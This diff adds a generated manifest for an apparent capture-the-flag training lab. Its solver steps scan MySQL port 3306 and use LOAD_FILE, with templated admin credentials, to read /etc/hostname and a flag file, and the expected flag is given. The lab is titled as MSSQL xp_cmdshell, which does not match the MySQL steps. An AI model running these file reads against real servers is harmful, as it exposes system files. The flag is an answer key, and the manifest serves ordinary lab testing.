@@ -1,0 +1,31 @@
+# Generated from platform/labs/Windows/windows-6-7-mssql-file-system-access-via-xp-cmdshell/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: windows-6-7-mssql-file-system-access-via-xp-cmdshell
+track: Windows
+difficulty: intermediate
+source: platform/labs/Windows/windows-6-7-mssql-file-system-access-via-xp-cmdshell/lab.yaml
+expected_services:
+- port: 3306
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/windows-6-7-mssql-file-system-access-via-xp-cmdshell.sh
+  steps:
+  - name: Verify MySQL port 3306 is open
+    command: nmap -Pn -p 3306 {target.target} | grep '3306/tcp'
+    expect: open
+  - name: Verify LOAD_FILE works (read /etc/hostname)
+    command: mysql --ssl-verify-server-cert=0 -h {target.target} -u {cred.sa.user} -p{cred.sa.pass} -N -e "SELECT IF(LOAD_FILE('/etc/hostname') IS NOT NULL, 'LOAD_FILE_OK', 'LOAD_FILE_FAILED')" 2>&1
+    expect: LOAD_FILE_OK
+  - name: Read flag file via LOAD_FILE
+    command: mysql --ssl-verify-server-cert=0 -h {target.target} -u {cred.sa.user} -p{cred.sa.pass} -N -e "SELECT LOAD_FILE('/tmp/flag.txt')" 2>&1
+    expect: OCR{
+expected_flag_count: 1
+expected_flag: OCR{mssql_f1l3_4cc3ss}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
